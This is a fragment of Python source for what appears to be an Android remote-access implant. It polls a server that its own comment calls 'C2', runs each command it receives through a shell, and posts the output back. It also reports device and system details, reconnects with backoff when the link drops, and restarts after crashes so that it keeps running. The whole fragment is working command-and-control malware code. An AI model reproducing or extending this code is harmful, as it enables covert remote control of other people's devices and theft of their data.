                                f"Android: {Build.VERSION.RELEASE} (SDK {Build.VERSION.SDK_INT})\n"
                                f"Temp Dir: {TEMP_DIR} (writable: {os.access(TEMP_DIR, os.W_OK)})\n"
                                f"CWD: {shell.cwd}\n"
                                f"Uptime: Service running\n"
                                f"Python: {sys.version}\n"
                            )

                        else:
                            output = shell.execute(command_line)

                        if output:
                            post_output(client_id, cmd_id, command_line, str(output))

                    except Exception as e:
                        # Individual command failure should NEVER crash the service
                        error_msg = f"Command '{command_line}' crashed: {e}"
                        _log(error_msg, "ERROR")
                        try:
                            post_output(client_id, cmd_id, command_line, error_msg)
                        except:
                            pass

            except Exception:
                # C2 connection lost — break to re-register
                time.sleep(retry_interval)
                retry_interval = min(retry_interval * 1.5, MAX_RETRY_INTERVAL)
                break

            time.sleep(HEARTBEAT_INTERVAL)

if __name__ == '__main__':
    try:
        start_service()
    except Exception as e:
        _log(f"FATAL: Service crashed: {e}\n{traceback.format_exc()}", "FATAL")
        # Wait and retry
        time.sleep(10)
        start_service()
